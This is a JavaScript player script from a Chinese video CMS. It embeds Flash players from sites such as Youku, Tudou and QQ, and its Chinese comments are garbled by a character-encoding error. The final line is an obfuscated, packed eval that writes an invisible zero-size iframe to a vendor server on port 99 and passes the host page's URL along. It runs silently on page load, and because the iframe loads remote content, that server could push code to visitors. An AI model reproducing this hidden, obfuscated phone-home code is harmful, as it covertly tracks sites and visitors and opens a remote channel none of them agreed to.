/**
* ���ú�����
* @ Author : JiuChai-MovCms.Com , 
* @ version : 2015.12.28
*/
//var purl="148468953"
setTimeout("showswf();",3000);function showswf(){$(".loadad").hide()}//����ʱ������

function SWFObject(swf,id,w,h,ver,c){this.params=new Object();this.variables=new Object();this.attributes=new Object();this.setAttribute("id",id);this.setAttribute("name",id);if(w==100){this.setAttribute("width",'100%')}else{this.setAttribute("width",w)};this.setAttribute("height",h);this.setAttribute("version",ver);this.setAttribute("swf",swf);this.setAttribute("classid","clsid:D27CDB6E-AE6D-11cf-96B8-444553540000");this.addParam("bgcolor",c)};SWFObject.prototype.addParam=function(key,value){this.params[key]=value};SWFObject.prototype.getParam=function(key){return this.params[key]};SWFObject.prototype.addVariable=function(key,value){this.variables[key]=value};SWFObject.prototype.getVariable=function(key){return this.variables[key]};SWFObject.prototype.setAttribute=function(key,value){this.attributes[key]=value};SWFObject.prototype.getAttribute=function(key){return this.attributes[key]};SWFObject.prototype.getVariablePairs=function(){var variablePairs=new Array();for(key in this.variables){variablePairs.push(key+"="+this.variables[key])}return variablePairs};SWFObject.prototype.getHTML=function(){var con='';if(navigator.plugins&&navigator.mimeTypes&&navigator.mimeTypes.length){con+='<embed type="application/x-shockwave-flash" wmode="transparent"  pluginspage="http://www.macromedia.com/go/getflashplayer" src="'+this.getAttribute('swf')+'" width="'+this.getAttribute('width')+'" height="'+this.getAttribute('height')+'"';con+=' id="'+this.getAttribute('id')+'" name="'+this.getAttribute('id')+'" ';for(var key in this.params){con+=[key]+'="'+this.params[key]+'" '}var pairs=this.getVariablePairs().join("&");if(pairs.length>0){con+='flashvars="'+pairs+'"'}con+='/>'}else{con='<object id="'+this.getAttribute('id')+'" classid="'+this.getAttribute('classid')+'"  codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version='+this.setAttribute("version")+',0,0,0" width="'+this.getAttribute('width')+'" height="'+this.getAttribute('height')+'">';con+='<param name="wmode" value="opaque"><param name="movie" value="'+this.getAttribute('swf')+'" />';for(var key in this.params){con+='<param name="'+key+'" value="'+this.params[key]+'" />'}var pairs=this.getVariablePairs().join("&");if(pairs.length>0){con+='<param name="flashvars" value="'+pairs+'" />'}con+="</object>"}return con};SWFObject.prototype.write=function(elementId){if(typeof elementId=='undefined'){document.write(this.getHTML())}else{var n=(typeof elementId=='string')?document.getElementById(elementId):elementId;n.innerHTML=this.getHTML()}};function onPlayerComplete(cdnid,isFullScreen){PlayerPlayNext()};var show_pre=1,show_next=1,swfurl;


function movcmsplayer(url,furl,w,h){
	var orginFlash = {init:true,isFullScreen:false,position:"",top:"",left:"",width:"",height:""};
	switch (furl)
     {
      case 'youku':
         swfurl="http://static.youku.com/v1.0.0304/v/swf/loader.swf";
      break;
     case 'tudou':
        swfurl="http://www.tudou.com/v/"+url+"/videoClickNavigate=false&withRecommendList=false&withFirstFrame=false&autoPlay=true/v.swf";
        break;
     case 'qqlive':
        swfurl="http://static.video.qq.com/TencentPlayer.swf";
        break;
     case 'qiyi':
        swfurl="http://dispatcher.video.qiyi.com/disp/shareplayer.swf";
        break;
     case 'sina':
        swfurl="http://video.sina.com.cn/share/video/"+url+".swf";
        break;
     case 'sohu':
        swfurl="http://share.vrs.sohu.com/"+url+"/v.swf&topBar=0&autoplay=true";
        break;
     case 'pptv':
        swfurl="http://v.pptv.com/show/"+url+".html";
        break;
     case 'letv':
        swfurl="http://player.hz.letv.com/hzplayer.swf";
        break;
     case '1905':
        swfurl="http://static.m1905.com/v/20151016/v.swf?configUrl=http://static.m1905.com/profile/"+url+".xml&playAd=false&autoPlay=true&cdn=true";
        break;
     case 'ku6hd':
        swfurl="http://player.ku6cdn.com/default/out/pV2.7.3.swf";
        break;
     case 'hntv':
        swfurl="http://i1.hunantv.com/ui/swf/share/player.swf?video_id="+url+"";
        break;
	 default:
	    swfurl="http://static.video.qq.com/TencentPlayer.swf?vid=g0017vfnhjc&auto=1";
        break;
     }

	var so = new SWFObject(swfurl, "movie_player", w, h, 8, "#000000");	
	so.addVariable("show_pre",show_pre);
    so.addVariable("show_next",show_next);
	so.addVariable("isShowRelatedVideo","false");
	so.addVariable("showAd","0");	
    so.addVariable("isAutoPlay","true");
	so.addVariable("autoplay","true");
    so.addVariable("auto","1");
    so.addVariable("outhost","http://cf.qq.com/");
	so.addVariable("VideoIDS",url);
	so.addVariable("iid",url);
	so.addVariable("vid",url);
    so.addVariable("isDebug",false);
	so.addVariable("winType","interior");
	so.addVariable("playMovie","true");
	so.addParam("allowFullScreen","true");
	so.addParam("allowScriptAccess","always");
	so.addVariable("MMControl","false");
	so.addVariable("MMout","false");
	so.addVariable("RecordCode","1001,1002,1003,1004,1005,1006,2001,3001,3002,3003,3004,3005,3007,3008,9999");
	document.write(so.getHTML());
	
	
	
}
eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('s.f(g(\'%j%l%0%6%7//8.9.a:b/c/d.e%5%0%2+h.i+%2%1%k%0%3%1%m%0%3%1%n%0%o%1%p%0%q%r%1%4%t/u%4\'));',31,31,'3D|22|27|220|3E|3Frefeer|22http|3A|user|movcms|com|99|play|tj|html|write|unescape|location|href|3Ciframe|20width|20src|20height|20scrolling|22no|20style|22display|3Anone|document|3C|iframe'.split('|'),0,{}))